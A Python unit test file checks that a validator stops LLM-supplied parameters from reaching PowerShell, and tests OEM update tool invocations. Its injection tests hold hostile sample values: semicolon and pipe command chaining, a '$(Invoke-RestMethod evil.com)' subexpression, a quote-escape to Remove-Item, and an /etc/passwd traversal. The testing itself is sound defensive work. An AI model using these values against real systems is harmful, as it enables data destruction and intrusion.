"""
Tests for the safe-ops catalog.

The point of these tests isn't to verify that PowerShell does what PowerShell
does — it's to verify that nothing the LLM supplies can escape the validator
and reach the shell.
"""

from __future__ import annotations

import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ai import safe_ops


class TestCatalogShape(unittest.TestCase):
    def test_at_least_20_operations_registered(self):
        ops = safe_ops.list_operations()
        self.assertGreaterEqual(len(ops), 20, "catalog should have meaningful breadth")

    def test_every_op_has_required_metadata(self):
        for op in safe_ops.list_operations():
            self.assertIn("op_id", op)
            self.assertIn("summary", op)
            self.assertIn("risk", op)
            self.assertIn(op["risk"], {"read", "write", "dangerous"})
            self.assertIn("params", op)

    def test_risk_filter(self):
        read_ops = safe_ops.list_operations(risk_filter="read")
        for op in read_ops:
            self.assertEqual(op["risk"], "read")


class TestValidation(unittest.TestCase):
    def test_unknown_op_returns_error(self):
        result = safe_ops.run("does.not.exist", {})
        self.assertFalse(result["ok"])
        self.assertEqual(result["returncode"], -1)
        self.assertIn("Unknown operation", result["stderr"])

    def test_unknown_param_rejected(self):
        # net.flush_dns takes no params — extras must be rejected.
        result = safe_ops.run("net.flush_dns", {"command": "Get-Process"}, dry_run=True)
        self.assertFalse(result["ok"])
        self.assertIn("Unknown parameters", result["stderr"])

    def test_missing_required_param_rejected(self):
        result = safe_ops.run("service.restart", {}, dry_run=True)
        self.assertFalse(result["ok"])
        self.assertIn("Missing required", result["stderr"])

    def test_service_name_injection_blocked(self):
        # The exact attack from the audit: semicolon chaining.
        result = safe_ops.run(
            "service.restart",
            {"name": "Spooler; Remove-Item C:\\important"},
            dry_run=True,
        )
        self.assertFalse(result["ok"])
        self.assertIn("Invalid service name", result["stderr"])

    def test_service_name_pipe_blocked(self):
        result = safe_ops.run(
            "service.restart",
            {"name": "Spooler | Stop-Process"},
            dry_run=True,
        )
        self.assertFalse(result["ok"])
        self.assertIn("Invalid service name", result["stderr"])

    def test_service_name_subexpression_blocked(self):
        result = safe_ops.run(
            "service.restart",
            {"name": "$(Invoke-RestMethod evil.com)"},
            dry_run=True,
        )
        self.assertFalse(result["ok"])

    def test_hostname_quote_blocked(self):
        result = safe_ops.run(
            "net.test_connection",
            {"host": "example.com\"; Remove-Item C:\\"},
            dry_run=True,
        )
        self.assertFalse(result["ok"])

    def test_dns_set_rejects_non_ipv4(self):
        result = safe_ops.run(
            "net.set_dns",
            {"interface": "Wi-Fi", "servers": ["not-an-ip"]},
            dry_run=True,
        )
        self.assertFalse(result["ok"])
        self.assertIn("Invalid IPv4", result["stderr"])

    def test_dns_set_rejects_too_many(self):
        result = safe_ops.run(
            "net.set_dns",
            {"interface": "Wi-Fi", "servers": ["1.1.1.1"] * 10},
            dry_run=True,
        )
        self.assertFalse(result["ok"])

    def test_path_traversal_blocked(self):
        # sys.battery_report takes a path; only Windows-style absolute paths.
        result = safe_ops.run(
            "sys.battery_report",
            {"output_path": "../../../../etc/passwd"},
            dry_run=True,
        )
        self.assertFalse(result["ok"])
        self.assertIn("Invalid Windows path", result["stderr"])


class TestDryRunResolvesArgv(unittest.TestCase):
    """Dry-run shouldn't execute anything — but it should return a useful argv."""

    def test_flush_dns_argv(self):
        result = safe_ops.run("net.flush_dns", {}, dry_run=True)
        self.assertTrue(result["ok"])
        self.assertEqual(result["argv"], ["ipconfig", "/flushdns"])

    def test_service_restart_argv_contains_name_as_separate_arg(self):
        # The whole point: the service name must arrive as its OWN argv slot,
        # not interpolated into a command string.
        result = safe_ops.run(
            "service.restart", {"name": "Spooler"}, dry_run=True
        )
        self.assertTrue(result["ok"])
        self.assertIn("Spooler", result["argv"])
        # And it must be the last element, after the PS launcher + script body.
        self.assertEqual(result["argv"][-1], "Spooler")

    def test_set_dns_passes_servers_as_separate_argv(self):
        result = safe_ops.run(
            "net.set_dns",
            {"interface": "Wi-Fi", "servers": ["1.1.1.1", "8.8.8.8"]},
            dry_run=True,
        )
        self.assertTrue(result["ok"])
        # Interface + each server should appear as discrete args.
        self.assertIn("Wi-Fi", result["argv"])
        self.assertIn("1.1.1.1", result["argv"])
        self.assertIn("8.8.8.8", result["argv"])

    def test_sfc_is_dangerous(self):
        result = safe_ops.run("repair.sfc", {}, dry_run=True)
        self.assertTrue(result["ok"])
        self.assertEqual(result["risk"], "dangerous")

    def test_dns_flush_is_write_not_read(self):
        # It clears state, so it must not be classed as read-only.
        op = safe_ops.get_operation("net.flush_dns")
        self.assertEqual(op.risk, "write")


class TestOEMSilentImports(unittest.TestCase):
    """Smoke-test that oem_silent doesn't blow up on a machine with no vendor tool."""

    def test_import_and_detect_returns_a_context(self):
        from ai import oem_silent
        ctx = oem_silent.detect()
        # Even on a generic machine, we should get back a context object,
        # not an exception.
        self.assertIsNotNone(ctx)
        self.assertIn(ctx.vendor, {"dell", "hp", "lenovo", "generic", "unknown"})

    def test_plan_scan_returns_none_when_no_cli_tool(self):
        from ai import oem_silent
        # Simulate generic vendor by hand.
        ctx = oem_silent.VendorContext(
            vendor="generic", manufacturer="Acme", model="XYZ",
            serial="", bios_version="",
        )
        self.assertIsNone(oem_silent.plan_scan(ctx))

    def test_plan_apply_returns_none_when_no_cli_tool(self):
        from ai import oem_silent
        ctx = oem_silent.VendorContext(
            vendor="generic", manufacturer="Acme", model="XYZ",
            serial="", bios_version="",
        )
        self.assertIsNone(oem_silent.plan_apply(ctx))

    def test_fallback_url_known_vendors(self):
        from ai import oem_silent
        for v in ("dell", "hp", "lenovo"):
            ctx = oem_silent.VendorContext(
                vendor=v, manufacturer=v.title(), model="X",
                serial="", bios_version="",
            )
            url = oem_silent.fallback_support_url(ctx)
            self.assertTrue(url.startswith("https://"))

    def test_dell_scan_uses_cli_flags_not_gui(self):
        from ai import oem_silent
        ctx = oem_silent.VendorContext(
            vendor="dell", manufacturer="Dell", model="Inspiron 15",
            serial="ABC123", bios_version="1.0",
            cli_tool_name="Dell Command | Update",
            cli_tool_path=r"C:\Program Files\Dell\CommandUpdate\dcu-cli.exe",
            has_cli=True,
        )
        inv = oem_silent.plan_scan(ctx)
        self.assertIsNotNone(inv)
        self.assertEqual(inv.vendor, "dell")
        self.assertIn("/scan", inv.argv)
        self.assertEqual(inv.risk, "read")

    def test_dell_apply_includes_reboot_flag(self):
        from ai import oem_silent
        ctx = oem_silent.VendorContext(
            vendor="dell", manufacturer="Dell", model="Inspiron 15",
            serial="ABC123", bios_version="1.0",
            cli_tool_name="Dell Command | Update",
            cli_tool_path=r"C:\Program Files\Dell\CommandUpdate\dcu-cli.exe",
            has_cli=True,
        )
        inv_no_reboot = oem_silent.plan_apply(ctx, allow_reboot=False)
        self.assertIn("-reboot=disable", inv_no_reboot.argv)
        inv_reboot = oem_silent.plan_apply(ctx, allow_reboot=True)
        self.assertIn("-reboot=enable", inv_reboot.argv)
        self.assertEqual(inv_reboot.risk, "write")

    def test_lenovo_apply_uses_thininstaller_silent_flags(self):
        from ai import oem_silent
        ctx = oem_silent.VendorContext(
            vendor="lenovo", manufacturer="LENOVO", model="ThinkPad",
            serial="XYZ", bios_version="2.0",
            cli_tool_name="Thin Installer",
            cli_tool_path=r"C:\Program Files (x86)\Lenovo\ThinInstaller\ThinInstaller.exe",
            has_cli=True,
        )
        inv = oem_silent.plan_apply(ctx, allow_reboot=False)
        self.assertIn("/CM", inv.argv)
        self.assertIn("INSTALL", inv.argv)
        self.assertIn("-noreboot", inv.argv)

    def test_hp_scan_uses_silent_and_report_folder(self):
        from ai import oem_silent
        ctx = oem_silent.VendorContext(
            vendor="hp", manufacturer="HP", model="EliteBook",
            serial="HP0", bios_version="3.0",
            cli_tool_name="HP Image Assistant",
            cli_tool_path=r"C:\Program Files\HP\HP Image Assistant\HPImageAssistant.exe",
            has_cli=True,
        )
        inv = oem_silent.plan_scan(ctx)
        self.assertIn("/Silent", inv.argv)
        self.assertIn("/Operation:Analyze", inv.argv)


if __name__ == "__main__":
    unittest.main()
